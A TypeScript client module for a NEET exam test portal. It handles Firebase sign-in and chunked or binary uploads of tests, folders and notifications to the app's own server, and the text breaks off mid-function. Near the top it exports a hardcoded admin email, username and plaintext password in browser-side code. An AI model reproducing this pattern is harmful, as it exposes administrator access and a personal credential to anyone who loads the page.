import { initializeApp } from '@firebase/app';
import {
  getAuth,
  GoogleAuthProvider,
  signInWithPopup,
  signOut as fbSignOut,
} from '@firebase/auth';
import firebaseConfig from '../firebase-applet-config.json';
import {
  CbtQuestion,
  CbtTestMeta,
  FirestoreErrorInfo,
  GlobalAttachmentPdf,
  OperationType,
  PortalNotification,
  StudentAccount,
  TestAttempt,
  TestFolder,
} from './types';
import {
  inferTrueQuestionCountFromHtml,
  normalizeCbtQuestion,
  parseCbtHtmlFile,
} from './utils/htmlTestParser';
import {
  compactQuestionForStorage,
  getAllVaultTests,
  getVaultDeletedTestIds,
  getVaultTestHtml,
  getVaultTestQuestions,
  markTestDeletedInVault,
  saveTestToVault,
} from './utils/permanentTestVault';

const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const googleProvider = new GoogleAuthProvider();

export const ADMIN_EMAIL = 'rahulyadav70y@gmail.com';
export const ADMIN_USERNAME = 'vsrahul73';
export const ADMIN_SECRET_PASS = 'Vijaylaxmi@123';

const LOCAL_TESTS_KEY = 'vs_neet_2027_tests_meta_v3';
const LOCAL_QUESTIONS_PREFIX = 'vs_neet_2027_q_';
const LOCAL_HTML_PREFIX = 'vs_neet_2027_html_';

export function handleFirestoreError(
  error: unknown,
  operationType: OperationType,
  path: string | null
): void {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo:
        auth.currentUser?.providerData.map((provider) => ({
          providerId: provider.providerId,
          displayName: provider.displayName,
          email: provider.email,
          photoUrl: provider.photoURL,
        })) || [],
    },
    operationType,
    path,
  };
  console.warn('Database sync notice:', JSON.stringify(errInfo));
}

export async function signInWithGoogle() {
  return signInWithPopup(auth, googleProvider);
}

export async function signOutUser() {
  return fbSignOut(auth);
}

let lastKnownServerVersion = 0;

const sessionDeletedTestIds = new Set<string>();

export function markTestDeletedLocally(testId: string) {
  const safeId = (testId || '').replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
  if (!safeId) return;
  sessionDeletedTestIds.add(safeId);
  ramTestBundleCache.delete(safeId);
  try {
    const rawDel = localStorage.getItem('vs_neet_deleted_test_ids_v1');
    const delList: string[] = rawDel ? JSON.parse(rawDel) : [];
    if (!delList.includes(safeId)) {
      delList.push(safeId);
      localStorage.setItem('vs_neet_deleted_test_ids_v1', JSON.stringify(delList));
    }
    localStorage.removeItem(`${LOCAL_QUESTIONS_PREFIX}${safeId}`);
    localStorage.removeItem(`${LOCAL_HTML_PREFIX}${safeId}`);
    const existingRaw = localStorage.getItem(LOCAL_TESTS_KEY);
    if (existingRaw) {
      const list: CbtTestMeta[] = JSON.parse(existingRaw);
      localStorage.setItem(
        LOCAL_TESTS_KEY,
        JSON.stringify(list.filter((t) => t && t.id !== safeId))
      );
    }
  } catch {
    // ignore
  }
  void markTestDeletedInVault(safeId).catch(() => {});
}

/**
 * Bootstrap all portal state (tests, folders, students, attempts, notifications) from the Express RAM/Disk store `/api/store/bootstrap`.
 * Supports `sinceVersion` so 10,000 concurrent students receive a 28-byte `{ unchanged: true }` response when nothing changed!
 */
export async function fetchPortalBootstrap(forceFull = false): Promise<{
  unchanged?: boolean;
  version?: number;
  portalLogoUrl?: string;
  globalAttachmentPdf?: GlobalAttachmentPdf | null;
  tests: CbtTestMeta[];
  deletedTestIds: string[];
  deletedFolderIds: string[];
  deletedStudentIds?: string[];
  deletedAttemptIds?: string[];
  tickedStudentMap?: Record<string, boolean>;
  folders: TestFolder[];
  students: StudentAccount[];
  attempts: TestAttempt[];
  notifications: PortalNotification[];
} | null> {
  try {
    const versionParam = !forceFull && lastKnownServerVersion > 0 ? `&sinceVersion=${lastKnownServerVersion}` : '';
    const res = await fetch(`/api/store/bootstrap?t=${Date.now()}${versionParam}`, {
      cache: 'no-store',
      headers: {
        'Cache-Control': 'no-cache',
        Pragma: 'no-cache',
      },
    });
    if (!res.ok) return null;
    const data = await res.json();
    if (data && data.unchanged) {
      return {
        unchanged: true,
        version: Number(data.version) || lastKnownServerVersion,
        tests: [],
        deletedTestIds: [],
        deletedFolderIds: [],
        deletedStudentIds: [],
        deletedAttemptIds: [],
        tickedStudentMap: {},
        folders: [],
        students: [],
        attempts: [],
        notifications: [],
      };
    }
    if (data && Number(data.version) > 0) {
      lastKnownServerVersion = Number(data.version);
    }
    const deletedTestIds: string[] = Array.isArray(data.deletedTestIds) ? data.deletedTestIds : [];
    for (const delId of deletedTestIds) {
      if (delId && !sessionDeletedTestIds.has(delId)) {
        markTestDeletedLocally(delId);
      }
    }

    return {
      unchanged: false,
      version: Number(data.version) || Date.now(),
      portalLogoUrl: typeof data.portalLogoUrl === 'string' ? data.portalLogoUrl : '',
      globalAttachmentPdf:
        data.globalAttachmentPdf && typeof data.globalAttachmentPdf === 'object'
          ? (data.globalAttachmentPdf as GlobalAttachmentPdf)
          : null,
      tests: Array.isArray(data.tests) ? data.tests : [],
      deletedTestIds,
      deletedFolderIds: Array.isArray(data.deletedFolderIds) ? data.deletedFolderIds : [],
      deletedStudentIds: Array.isArray(data.deletedStudentIds) ? data.deletedStudentIds : [],
      deletedAttemptIds: Array.isArray(data.deletedAttemptIds) ? data.deletedAttemptIds : [],
      tickedStudentMap:
        data.tickedStudentMap && typeof data.tickedStudentMap === 'object'
          ? (data.tickedStudentMap as Record<string, boolean>)
          : {},
      folders: Array.isArray(data.folders) ? data.folders : [],
      students: Array.isArray(data.students) ? data.students : [],
      attempts: Array.isArray(data.attempts) ? data.attempts : [],
      notifications: Array.isArray(data.notifications) ? data.notifications : [],
    };
  } catch {
    return null;
  }
}

/**
 * Sync Admin Student Tick (✔) / Verification state across all student & admin devices in real time.
 */
export async function saveAdminStudentTickToFirestore(params: {
  tickKey?: string;
  value?: boolean;
  tickMap?: Record<string, boolean>;
  studentId?: string;
}): Promise<Record<string, boolean> | null> {
  lastKnownServerVersion = 0;
  try {
    const res = await fetch('/api/store/student-tick', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });
    if (res.ok) {
      const data = await res.json();
      if (data && data.tickedStudentMap && typeof data.tickedStudentMap === 'object') {
        try {
          localStorage.setItem(
            'vs_admin_ticked_students_v1',
            JSON.stringify(data.tickedStudentMap)
          );
        } catch {
          // ignore
        }
        return data.tickedStudentMap as Record<string, boolean>;
      }
    }
  } catch {
    // ignore network error
  }
  return null;
}

/**
 * Save or reset the custom Portal Logo URL across all student devices.
 */
export async function savePortalLogoToFirestore(portalLogoUrl: string): Promise<void> {
  try {
    if (portalLogoUrl) {
      localStorage.setItem('vs_neet_portal_logo_url', portalLogoUrl);
    } else {
      localStorage.removeItem('vs_neet_portal_logo_url');
    }
  } catch {
    // ignore
  }
  try {
    await fetch('/api/store/logo', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ portalLogoUrl }),
    });
  } catch {
    // ignore
  }
}

/**
 * Send a live Push Notification from Admin to all Students' Phones.
 */
export async function sendNotificationToFirestore(
  notif: Omit<PortalNotification, 'id' | 'createdAt'> & { id?: string; createdAt?: number }
): Promise<PortalNotification | null> {
  const cleanNotif: PortalNotification = {
    id: notif.id || `notif_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 6)}`,
    title: (notif.title || 'Vs Test Update').trim().slice(0, 200),
    message: (notif.message || '').trim().slice(0, 1000),
    targetBatch: (notif.targetBatch || 'All Batches').trim().slice(0, 120),
    testId: notif.testId ? String(notif.testId).trim() : undefined,
    testTitle: notif.testTitle ? String(notif.testTitle).trim().slice(0, 250) : undefined,
    createdAt: Number(notif.createdAt) || Date.now(),
  };

  try {
    const res = await fetch('/api/store/notification', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ notification: cleanNotif }),
    });
    if (res.ok) {
      const data = await res.json();
      return data.notification || cleanNotif;
    }
  } catch {
    // ignore
  }
  return cleanNotif;
}

/**
 * Delete a Notification from Server Disk Store.
 */
export async function deleteNotificationFromFirestore(notifId: string): Promise<void> {
  try {
    await fetch(`/api/store/notification/${encodeURIComponent(notifId)}`, {
      method: 'DELETE',
    });
  } catch {
    // ignore
  }
}

export function saveTestsMetaToLocalStorageSafe(list: CbtTestMeta[]): void {
  try {
    localStorage.setItem(LOCAL_TESTS_KEY, JSON.stringify(list));
    return;
  } catch {
    // Quota exceeded: first purge redundant per-test question/html keys from localStorage (stored in IndexedDB Vault)
    try {
      const keysToRemove: string[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && (k.startsWith(LOCAL_QUESTIONS_PREFIX) || k.startsWith(LOCAL_HTML_PREFIX))) {
          keysToRemove.push(k);
        }
      }
      for (const k of keysToRemove) {
        localStorage.removeItem(k);
      }
      localStorage.setItem(LOCAL_TESTS_KEY, JSON.stringify(list));
      return;
    } catch {
      // Final fallback: keep banners on most recent 25 tests in localStorage while IndexedDB + Server hold 100% of banners
      try {
        const trimmed = list.map((t, idx) =>
          idx < 25 ? t : { ...t, bannerUrl: t.bannerUrl && t.bannerUrl.length < 2000 ? t.bannerUrl : undefined }
        );
        localStorage.setItem(LOCAL_TESTS_KEY, JSON.stringify(trimmed));
      } catch {
        // ignore
      }
    }
  }
}

export function saveFoldersToLocalStorageSafe(folders: TestFolder[]): void {
  try {
    localStorage.setItem('vs_neet_2027_folders_cache_v1', JSON.stringify(folders));
  } catch {
    try {
      const keysToRemove: string[] = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && (k.startsWith(LOCAL_QUESTIONS_PREFIX) || k.startsWith(LOCAL_HTML_PREFIX))) {
          keysToRemove.push(k);
        }
      }
      for (const k of keysToRemove) {
        localStorage.removeItem(k);
      }
      localStorage.setItem('vs_neet_2027_folders_cache_v1', JSON.stringify(folders));
    } catch {
      // ignore
    }
  }
}

/**
 * Save or update an Admin Test Folder in Server Disk Store.
 */
export async function saveFolderToFirestore(folder: TestFolder): Promise<void> {
  const safeId = (folder.id || `folder_${Date.now().toString(36)}`)
    .replace(/[^a-zA-Z0-9_-]/g, '_')
    .slice(0, 100);
  const cleanFolder: TestFolder = {
    id: safeId,
    name: (folder.name || 'General Folder').trim().slice(0, 180),
    description: (folder.description || '').trim().slice(0, 450),
    ...(folder.subject ? { subject: String(folder.subject).trim().slice(0, 120) } : {}),
    ...(folder.bannerUrl !== undefined
      ? { bannerUrl: folder.bannerUrl ? String(folder.bannerUrl) : '' }
      : {}),
    ...(folder.attachmentPdfId ? { attachmentPdfId: String(folder.attachmentPdfId) } : {}),
    ...(folder.attachmentPdfName ? { attachmentPdfName: String(folder.attachmentPdfName) } : {}),
    createdAt: Number(folder.createdAt) || Date.now(),
  };

  try {
    const rawDel = localStorage.getItem('vs_neet_deleted_folder_ids_v1');
    if (rawDel) {
      const delIds: string[] = JSON.parse(rawDel);
      localStorage.setItem(
        'vs_neet_deleted_folder_ids_v1',
        JSON.stringify(delIds.filter((id) => id !== safeId))
      );
    }
  } catch {
    // ignore
  }

  try {
    const rawFolders = localStorage.getItem('vs_neet_2027_folders_cache_v1');
    const folderList: TestFolder[] = rawFolders ? JSON.parse(rawFolders) : [];
    const idx = folderList.findIndex((f) => f && f.id === safeId);
    const hasExplicitBanner = folder.bannerUrl !== undefined;
    if (idx >= 0) {
      const prevBanner = folderList[idx]?.bannerUrl;
      folderList[idx] = {
        ...folderList[idx],
        ...cleanFolder,
        bannerUrl: hasExplicitBanner
          ? cleanFolder.bannerUrl || undefined
          : prevBanner,
      };
    } else {
      folderList.push({
        ...cleanFolder,
        bannerUrl: cleanFolder.bannerUrl || undefined,
      });
    }
    saveFoldersToLocalStorageSafe(folderList);
  } catch {
    // ignore
  }

  lastKnownServerVersion = 0;

  try {
    await fetchWithRetry('/api/store/folder', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ folder: cleanFolder, explicitAdminCreate: true }),
    });
  } catch {
    // ignore network error
  }
}

/**
 * Delete an Admin Test Folder from Server Disk Store.
 */
export async function deleteFolderFromFirestore(folderId: string): Promise<void> {
  const safeId = folderId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
  lastKnownServerVersion = 0;

  try {
    const rawDel = localStorage.getItem('vs_neet_deleted_folder_ids_v1');
    const delIds: string[] = rawDel ? JSON.parse(rawDel) : [];
    if (!delIds.includes(safeId)) {
      delIds.push(safeId);
      localStorage.setItem('vs_neet_deleted_folder_ids_v1', JSON.stringify(delIds));
    }
  } catch {
    // ignore
  }

  try {
    await fetch(`/api/store/folder/${encodeURIComponent(safeId)}`, {
      method: 'DELETE',
    });
  } catch {
    // ignore
  }
}

/**
 * Resilient fetch wrapper with automatic 3x exponential backoff retry for 5GB+ chunked uploads.
 */
async function fetchWithRetry(
  url: string,
  options: RequestInit,
  maxRetries = 3
): Promise<Response> {
  let lastErr: unknown;
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const res = await fetch(url, options);
      if (res.ok || (res.status >= 400 && res.status < 500 && res.status !== 408 && res.status !== 429)) {
        return res;
      }
      lastErr = new Error(`HTTP ${res.status}`);
    } catch (e) {
      lastErr = e;
    }
    if (attempt < maxRetries) {
      await new Promise((r) => setTimeout(r, 250 * Math.pow(2, attempt)));
    }
  }
  throw lastErr || new Error('Network request failed after retries');
}

/**
 * Upload questions in fast parallel 30-question chunks.
 * When hasRawHtml is true, omits duplicate base64 diagrams from the question objects
 * since they are already transmitted inside rawHtml (cutting 5GB upload size by 50%).
 */
async function uploadQuestionsInChunksToServer(
  safeId: string,
  meta: CbtTestMeta,
  questions: CbtQuestion[],
  hasRawHtml = false,
  onChunkBytes?: (bytes: number) => void
): Promise<void> {
  const compacted = questions.map((q, idx) =>
    compactQuestionForStorage(normalizeCbtQuestion(q, idx), hasRawHtml)
  );
  const CHUNK_SIZE = hasRawHtml ? 80 : 30;
  const totalChunks = Math.max(1, Math.ceil(compacted.length / CHUNK_SIZE));
  const PARALLEL_WORKERS = Math.min(2, totalChunks);
  let nextIdx = 0;

  const worker = async () => {
    while (nextIdx < totalChunks) {
      const cIdx = nextIdx++;
      const slice = compacted.slice(cIdx * CHUNK_SIZE, (cIdx + 1) * CHUNK_SIZE);
      const bodyStr = JSON.stringify({
        chunkIndex: cIdx,
        totalChunks,
        questionsChunk: slice,
        meta: cIdx === 0 ? meta : undefined,
        explicitAdminCreate: true,
      });
      const res = await fetchWithRetry(`/api/store/test/${encodeURIComponent(safeId)}/questions-chunk`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyStr,
      });
      if (!res.ok) {
        const errText = await res.text().catch(() => '');
        throw new Error(`Questions chunk ${cIdx + 1}/${totalChunks} failed (HTTP ${res.status}): ${errText}`);
      }
      onChunkBytes?.(bodyStr.length);
    }
  };

  await Promise.all(Array.from({ length: PARALLEL_WORKERS }, () => worker()));
}

/**
 * Upload raw HTML content in safe 1.2MB chunks (2x concurrent workers + 3x retry)
 * for large HTML test papers without exhausting mobile browser RAM.
 */
async function uploadHtmlInChunksToServer(
  safeId: string,
  rawHtml: string,
  onChunkBytes?: (bytes: number) => void
): Promise<void> {
  if (!rawHtml || !rawHtml.trim()) return;
  const CHUNK_CHARS = 1200000;
  const totalChunks = Math.max(1, Math.ceil(rawHtml.length / CHUNK_CHARS));
  const PARALLEL_WORKERS = Math.min(2, totalChunks);
  let nextIdx = 0;

  const worker = async () => {
    while (nextIdx < totalChunks) {
      const cIdx = nextIdx++;
      const htmlChunk = rawHtml.slice(cIdx * CHUNK_CHARS, (cIdx + 1) * CHUNK_CHARS);
      const bodyStr = JSON.stringify({
        chunkIndex: cIdx,
        totalChunks,
        htmlChunk,
        explicitAdminCreate: true,
      });
      const res = await fetchWithRetry(`/api/store/test/${encodeURIComponent(safeId)}/html-chunk`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyStr,
      });
      if (!res.ok) {
        const errText = await res.text().catch(() => '');
        throw new Error(`HTML chunk ${cIdx + 1}/${totalChunks} failed (HTTP ${res.status}): ${errText}`);
      }
      onChunkBytes?.(htmlChunk.length);
    }
  };

  await Promise.all(Array.from({ length: PARALLEL_WORKERS }, () => worker()));
}

/**
 * Build a zero-JSON-escape binary frame Blob:
 * [4-byte UInt32LE headerByteLength][UTF-8 JSON header (meta + compactedQuestions)][raw UTF-8 HTML bytes]
 * Avoids JSON.stringify/JSON.parse escaping on 10MB–50MB HTML strings (< 1ms build time).
 */
function buildFastBinaryTestBlob(
  meta: CbtTestMeta,
  compactedQuestions: CbtQuestion[],
  rawHtml: string,
  explicitAdminCreate: boolean,
  stageOnly = false
): Blob {
  const headerJson = JSON.stringify({
    meta,
    questions: compactedQuestions,
    explicitAdminCreate,
    stageOnly,
  });
  const headerBytes = new TextEncoder().encode(headerJson);
  const lenArr = new Uint32Array([headerBytes.byteLength]);
  return new Blob([lenArr.buffer, headerBytes, rawHtml || ''], {
    type: 'application/octet-stream',
  });
}

/**
 * Send binary test frame to `/api/store/test-fast` with real-time byte progress via XMLHttpRequest
 * (or fetch when no progress callback is needed).
 */
async function sendFastBinaryTestBlob(
  blob: Blob,
  onProgress?: (transferredBytes: number, totalBytes: number) => void
): Promise<boolean> {
  const totalBytes = Math.max(1, blob.size);
  if (!onProgress || typeof XMLHttpRequest === 'undefined') {
    const res = await fetchWithRetry('/api/store/test-fast', {
      method: 'POST',
      headers: { 'Content-Type': 'application/octet-stream' },
      body: blob,
    });
    return res.ok;
  }

  return new Promise<boolean>((resolve) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/store/test-fast', true);
    xhr.timeout = 120000;
    xhr.setRequestHeader('Content-Type', 'application/octet-stream');
    xhr.upload.onprogress = (evt) => {
      if (evt.lengthComputable) {
        onProgress(evt.loaded, evt.total);
      } else {
        onProgress(Math.min(totalBytes, evt.loaded), totalBytes);
      }
    };
    xhr.onload = () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        onProgress(totalBytes, totalBytes);
        resolve(true);
      } else {
        resolve(false);
      }
    };
    xhr.onerror = () => resolve(false);
    xhr.onabort = () => resolve(false);
    xhr.ontimeout = () => resolve(false);
    xhr.send(blob);
  });
}

// Track background pre-staged HTML uploads started when Admin selects a file in Draft Preview
const inFlightStagePromises = new Map<string, Promise<boolean>>();
const completedStageTestIds = new Set<string>();

/**
 * Pre-stage an HTML test paper on the server in the background as soon as Admin selects the file
 * in Draft Preview so clicking "Publish Test to Student Portal" completes in <25ms!
 */
export function prestageTestHtmlOnServer(
  meta: CbtTestMeta,
  questions: CbtQuestion[],
  rawHtml: string
): void {
  if (batchUploadActiveFlag || !meta?.id || !rawHtml || rawHtml.length < 500 || rawHtml.length > 16000000) {
    return;
  }
  const safeId = meta.id.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
  if (inFlightStagePromises.has(safeId) || completedStageTestIds.has(safeId)) return;

  const hasFullHtml = rawHtml.trim().length > 500;
  const compactedQs = (questions || []).map((q, idx) =>
    compactQuestionForStorage(normalizeCbtQuestion(q, idx), hasFullHtml)
  );
  setRamBundleCache(safeId, compactedQs, rawHtml);
  void saveTestToVault({ ...meta, id: safeId }, compactedQs, rawHtml);

  const blob = buildFastBinaryTestBlob({ ...meta, id: safeId }, compactedQs, rawHtml, true, true);
  const stagePromise = sendFastBinaryTestBlob(blob)
    .then((ok) => {
      if (ok) completedStageTestIds.add(safeId);
      return ok;
    })
    .catch(() => false)
    .finally(() => {
      inFlightStagePromises.delete(safeId);
    });

  inFlightStagePromises.set(safeId, stagePromise);
}

// Track which test IDs have already been checked/healed in this browser session to prevent SSE loops
const healedTestIdsInSession = new Set<string>();

// Fast in-memory bundle cache (0ms read when opening a test)
const ramTestBundleCache = new Map<string, { questions: CbtQuestion[]; rawHtml: string }>();

function setRamBundleCache(testId: string, questions: CbtQuestion[], rawHtml: string) {
  if (!testId) return;
  if (rawHtml && rawHtml.length > 3500000) {
    ramTestBundleCache.clear();
    return;
  }
  if (ramTestBundleCache.size >= 1 && !ramTestBundleCache.has(testId)) {
    ramTestBundleCache.clear();
  }
  ramTestBundleCache.set(testId, { questions, rawHtml });
}

// Track whether a multi-file batch upload is currently running so SSE & IndexedDB don't OOM mobile browsers
let batchUploadActiveFlag = false;

export function setBatchUploadActive(active: boolean): void {
  batchUploadActiveFlag = active;
}

export function isBatchUploadActive(): boolean {
  return batchUploadActiveFlag;
}

export interface SaveTestOptions {
  awaitServerSync?: boolean;
  explicitAdminCreate?: boolean;
  skipLocalVault?: boolean;
  skipLocalStateUpdate?: boolean;
  onProgress?: (transferredBytes: number, totalBytes: number) => void;
}

/**
 * Save a test, its normalized questions, and optional raw HTML content to:
 * 1. Express Server RAM + Disk Store (`/api/store/test-fast` single-frame binary stream)
 * 2. Browser IndexedDB Permanent Vault (non-blocking background write for single files)
 * 3. Browser localStorage (fast metadata index)
 */
export async function saveTestToFirestore(
  meta: CbtTestMeta,
  questions?: CbtQuestion[],
  rawHtml?: string,
  options?: SaveTestOptions
): Promise<void> {
  const safeId = (meta.id || `test_${Date.now().toString(36)}`)
    .replace(/[^a-zA-Z0-9_-]/g, '_')
    .slice(0, 100);

  if (sessionDeletedTestIds.has(safeId) && !options?.explicitAdminCreate) {
    return;
  }

  const hasFullHtml = Boolean(rawHtml && rawHtml.trim().length > 500);

  const normalizedQuestions =
    questions && questions.length > 0
      ? questions.map((q, idx) => normalizeCbtQuestion(q, idx))
      : undefined;

  const compactedQuestions = normalizedQuestions
    ? normalizedQuestions.map((q) => compactQuestionForStorage(q, hasFullHtml))
    : [];

  const knownQCount = Math.max(
    compactedQuestions.length,
    Number(meta.totalQuestions) || 0
  );

  const trueQCount = meta.isPdfOnly
    ? 0
    : knownQCount >= 5
      ? knownQCount
      : inferTrueQuestionCountFromHtml(rawHtml || '', meta.title || '', knownQCount);

  const correctMarks = Number(meta.correctMarks) >= 0 ? Number(meta.correctMarks) : 4;
  const difficulty =
    meta.difficulty === 'Easy' || meta.difficulty === 'Medium' || meta.difficulty === 'Hard'
      ? meta.difficulty
      : trueQCount >= 120
        ? 'Hard'
        : trueQCount >= 45
          ? 'Medium'
          : 'Easy';

  const cleanMeta: CbtTestMeta = {
    id: safeId,
    title: (meta.title || 'NEET CBT Test').slice(0, 450),
    subTitle: (meta.subTitle || 'NEET CBT Test Series').slice(0, 450),
    chapter: (meta.chapter || 'Complete Syllabus').slice(0, 800),
    subject: (meta.subject || 'Biology (जीव विज्ञान)').slice(0, 250),
    difficulty,
    folderId: (meta.folderId || 'folder_prayas').slice(0, 120),
    folderName: (meta.folderName || 'PRAYAS Minor Test Series').slice(0, 180),
    ...(meta.bannerUrl !== undefined
      ? { bannerUrl: meta.bannerUrl ? String(meta.bannerUrl) : '' }
      : {}),
    totalQuestions: trueQCount,
    maxMarks: meta.isPdfOnly ? 0 : Math.max(Number(meta.maxMarks) || 0, trueQCount * correctMarks),
    correctMarks,
    negativeMarks: Number(meta.negativeMarks) >= 0 ? Number(meta.negativeMarks) : 1,
    durationMinutes: Number(meta.durationMinutes) || Math.max(60, trueQCount),
    openCount: Number(meta.openCount) || 0,
    playCount: Number(meta.playCount) || 0,
    completionCount: Number(meta.completionCount) || 0,
    totalScoreSum: Number(meta.totalScoreSum) || 0,
    highScore: Number(meta.highScore) || 0,
    chunkCount: meta.chunkCount || (compactedQuestions.length > 0 ? 1 : 0),
    htmlChunkCount: meta.htmlChunkCount || (rawHtml ? 1 : 0),
    scheduledAt: meta.scheduledAt && Number(meta.scheduledAt) > 0 ? Number(meta.scheduledAt) : 0,
    ...(meta.isPinned !== undefined ? { isPinned: Boolean(meta.isPinned) } : {}),
    ...(meta.pinnedAt ? { pinnedAt: Number(meta.pinnedAt) } : {}),
    ...(meta.attachmentPdfId ? { attachmentPdfId: String(meta.attachmentPdfId) } : {}),
    ...(meta.attachmentPdfName ? { attachmentPdfName: String(meta.attachmentPdfName) } : {}),
    ...(meta.isPdfOnly !== undefined ? { isPdfOnly: Boolean(meta.isPdfOnly) } : {}),
    createdAt: Number(meta.createdAt) || Date.now(),
    ...(meta.isBuiltIn !== undefined ? { isBuiltIn: Boolean(meta.isBuiltIn) } : {}),
    ...(meta.assetUrl ? { assetUrl: String(meta.assetUrl) } : {}),
    ...(meta.lastPlayedAt ? { lastPlayedAt: Number(meta.lastPlayedAt) } : {}),
  };

  healedTestIdsInSession.add(safeId);
  lastKnownServerVersion = 0;

  const isMultiFileBatch = Boolean(options?.skipLocalVault || batchUploadActiveFlag);

  if (!isMultiFileBatch) {
    if (compactedQuestions.length > 0 || rawHtml) {
      const prevCached = ramTestBundleCache.get(safeId);
      setRamBundleCache(
        safeId,
        compactedQuestions.length > 0 ? compactedQuestions : prevCached?.questions || [],
        rawHtml !== undefined ? rawHtml : prevCached?.rawHtml || ''
      );
    }

    const hasExplicitBanner = meta.bannerUrl !== undefined;
    let existingLocalBanner: string | undefined;
    let existingLocalList: CbtTestMeta[] = [];
    try {
      const existingRaw = localStorage.getItem(LOCAL_TESTS_KEY);
      existingLocalList = existingRaw ? JSON.parse(existingRaw) : [];
      const found = existingLocalList.find((t) => t && t.id === safeId);
      if (found?.bannerUrl) existingLocalBanner = found.bannerUrl;
    } catch {
      existingLocalList = [];
    }

    const resolvedLocalBanner = hasExplicitBanner
      ? cleanMeta.bannerUrl || undefined
      : existingLocalBanner;

    // 1. Save into IndexedDB Permanent Vault and await so local Vault is 100% up-to-date before syncPortalStore runs
    await saveTestToVault(
      { ...cleanMeta, bannerUrl: resolvedLocalBanner },
      compactedQuestions.length > 0 ? compactedQuestions : undefined,
      rawHtml
    ).catch(() => {});

    // 2. Save metadata index into localStorage immediately with quota protection
    try {
      const idx = existingLocalList.findIndex((t) => t && t.id === safeId);
      const metaForLocal: CbtTestMeta = {
        ...cleanMeta,
        bannerUrl: resolvedLocalBanner,
      };
      if (idx >= 0) {
        existingLocalList[idx] = { ...existingLocalList[idx], ...metaForLocal };
      } else {
        existingLocalList.unshift(metaForLocal);
      }
      saveTestsMetaToLocalStorageSafe(existingLocalList);
    } catch {
      // ignore browser localStorage quota
    }
  } else {
    // During multi-file batch uploads, skip IndexedDB entirely; server is authoritative and syncPortalStore refreshes at batch end
  }

  // 3. Primary Server Persistence: Ultra-fast binary frame upload (or pre-staged commit)
  const executeServerSync = async () => {
    const assertOk = async (res: Response, label: string) => {
      if (!res.ok) {
        const errText = await res.text().catch(() => '');
        throw new Error(`${label} failed (HTTP ${res.status}): ${errText}`);
      }
    };

    try {
      // Fast Path A: If this test was already pre-staged while Admin was viewing Draft Preview
      if (completedStageTestIds.has(safeId)) {
        completedStageTestIds.delete(safeId);
        const res = await fetchWithRetry('/api/store/test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            meta: cleanMeta,
            questions: compactedQuestions,
            explicitAdminCreate: Boolean(options?.explicitAdminCreate),
          }),
        });
        await assertOk(res, 'Staged test commit');
        options?.onProgress?.(1, 1);
        return;
      }

      const pendingStage = inFlightStagePromises.get(safeId);
      if (pendingStage) {
        const stagedOk = await pendingStage;
        if (stagedOk) {
          completedStageTestIds.delete(safeId);
          const res = await fetchWithRetry('/api/store/test', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              meta: cleanMeta,
              questions: compactedQuestions,
              explicitAdminCreate: Boolean(options?.explicitAdminCreate),
            }),
          });
          await assertOk(res, 'Pending staged test commit');
          options?.onProgress?.(1, 1);
          return;
        }
      }

      // Fast Path B: Metadata-only update (no questions and no rawHtml — e.g. Banner update, Rename, Folder change, Pin, Schedule)
      if (compactedQuestions.length === 0 && (!rawHtml || !rawHtml.trim())) {
        const res = await fetchWithRetry('/api/store/test', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            meta: cleanMeta,
            explicitAdminCreate: Boolean(options?.explicitAdminCreate),
          }),
        });
        await assertOk(res, 'Test metadata save');
        options?.onProgress?.(1, 1);
        return;
      }

      // Fast Path C: Single-Request Zero-Escape Binary Frame Upload (up to 16MB total frame size, safely below reverse proxy limits)
      const htmlStr = rawHtml || '';
      const blob = buildFastBinaryTestBlob(
        cleanMeta,
        compactedQuestions,
        htmlStr,
        Boolean(options?.explicitAdminCreate),
        false
      );
      if (blob.size <= 16 * 1024 * 1024) {
        const fastOk = await sendFastBinaryTestBlob(blob, options?.onProgress);
        if (fastOk) {
          return;
        }
      }

      // Fallback Path D: Reliable 1.2MB chunked upload for large (>16MB) single files
      const metaInitRes = await fetchWithRetry('/api/store/test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          meta: cleanMeta,
          explicitAdminCreate: Boolean(options?.explicitAdminCreate),
        }),
      });
      await assertOk(metaInitRes, 'Test chunked upload init');

      const estQuestionsBytes =
        compactedQuestions.length > 0
          ? hasFullHtml
            ? compactedQuestions.length * 450
            : compactedQuestions.length * 18000
          : 0;
      const estHtmlBytes = htmlStr.length;
      const totalEstBytes = Math.max(1, estQuestionsBytes + estHtmlBytes);
      let transferredSoFar = 0;

      const handleChunkBytes = (bytes: number) => {
        transferredSoFar = Math.min(totalEstBytes, transferredSoFar + bytes);
        options?.onProgress?.(transferredSoFar, totalEstBytes);
      };

      await Promise.all([
        compactedQuestions.length > 0
          ? uploadQuestionsInChunksToServer(
              safeId,
              cleanMeta,
              compactedQuestions,
              hasFullHtml,
              handleChunkBytes
            )
          : Promise.resolve(),
        htmlStr.trim().length > 0
